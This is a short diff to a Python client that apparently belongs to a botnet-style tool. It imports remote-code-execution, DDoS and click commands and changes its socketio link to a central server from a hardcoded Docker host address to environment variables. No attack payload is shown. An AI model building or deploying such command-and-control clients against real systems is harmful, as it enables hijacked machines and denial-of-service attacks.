@@ -1,12 +1,13 @@
+import socketio
+import uuid
+
 from commands.click import CommandClick
 from commands.rce import CommandRCE
 from commands.ddos import CommandDDoS
 from commands.command import Command, CommandType
-import socketio
-import uuid
 from queue import Queue
-
 from utils import Interval
+from os import getenv
 
 socket_client = socketio.Client()
 running_command: Command = None
@@ -15,7 +16,7 @@ command_queue = Queue()
 
 
 def start_client() -> None:
-    socket_client.connect("ws://host.docker.internal:5000")
+    socket_client.connect("ws://{}:{}".format(getenv("CENTRAL_SERVER_IP"), getenv("CENTRAL_SERVER_PORT")))
 
 # SocketIO event definitions
 
